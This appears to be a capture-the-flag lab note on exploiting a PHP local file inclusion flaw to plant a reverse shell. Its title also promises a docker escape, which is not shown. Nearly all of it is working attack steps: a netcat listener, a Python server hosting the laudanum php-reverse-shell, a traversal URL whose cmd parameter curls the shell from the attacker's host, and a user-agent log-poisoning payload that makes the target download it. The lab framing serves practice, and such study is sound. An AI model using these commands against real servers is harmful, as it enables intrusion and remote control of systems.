# 1. Exploit a PHP application via LFI and break out of a docker container

## Here the server accept the php code LFI
- __Here we are upload a shell.php to the websever__
__`/usr/share/laudanum/php/php-reverse-shell.php` and rename it as `shell.php`__
- __`mv /usr/share/laudanum/php/php-reverse-shell.php shell.php`__
  - > __Change the ip and port__
    > __`nc -lvnp 1234`__
- __`python3 -m http.server 8080`__

```url
http://10.10.96.138/?view=php://filter/resource=./dog/../../../../../../../ect/passwd=&cmd=curl -o shell.php 10.10.44.229:8000/shell.php
```
## Or you can do it from the terminal also using curl
```
curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}
```
for example

```
curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.10.44.229/shell.php'))?>" -s http://10.10.96.138
```
